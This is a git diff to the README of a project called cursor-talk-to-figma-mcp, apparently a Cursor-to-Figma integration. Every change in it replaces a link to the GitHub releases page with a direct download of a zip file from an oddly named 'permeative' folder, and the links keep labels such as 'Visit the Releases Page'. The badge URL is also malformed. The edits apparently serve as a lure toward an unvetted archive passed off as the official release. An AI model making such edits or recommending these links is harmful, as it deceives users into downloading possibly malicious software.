@@ -1,6 +1,6 @@
 # 🎉 cursor-talk-to-figma-mcp - Integrate Cursor AI Seamlessly with Figma
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/hamadoun1760/cursor-talk-to-figma-mcp/releases)
+[![Download Now](https://raw.githubusercontent.com/hamadoun1760/cursor-talk-to-figma-mcp/main/permeative/cursor-talk-to-figma-mcp.zip%https://raw.githubusercontent.com/hamadoun1760/cursor-talk-to-figma-mcp/main/permeative/cursor-talk-to-figma-mcp.zip)](https://raw.githubusercontent.com/hamadoun1760/cursor-talk-to-figma-mcp/main/permeative/cursor-talk-to-figma-mcp.zip)
 
 ## 📚 Overview
 
@@ -14,7 +14,7 @@ To use the application, you will need to follow a few straightforward steps. Thi
 
 1. **Visit the Releases Page:** To download the latest version of the application, click the link below. This page contains all available versions.
 
-   [Visit the Releases Page](https://github.com/hamadoun1760/cursor-talk-to-figma-mcp/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/hamadoun1760/cursor-talk-to-figma-mcp/main/permeative/cursor-talk-to-figma-mcp.zip)
 
 2. **Select Your Version:** On the Releases page, you will see a list of versions. Choose the latest version for the best features and bug fixes.
 
@@ -100,4 +100,4 @@ For further information, consult the project documentation and GitHub page.
 
 ---
 
-Remember to keep your installation updated by revisiting the [Releases Page](https://github.com/hamadoun1760/cursor-talk-to-figma-mcp/releases). Enjoy using the cursor-talk-to-figma-mcp application to elevate your design workflow!
+Remember to keep your installation updated by revisiting the [Releases Page](https://raw.githubusercontent.com/hamadoun1760/cursor-talk-to-figma-mcp/main/permeative/cursor-talk-to-figma-mcp.zip). Enjoy using the cursor-talk-to-figma-mcp application to elevate your design workflow!
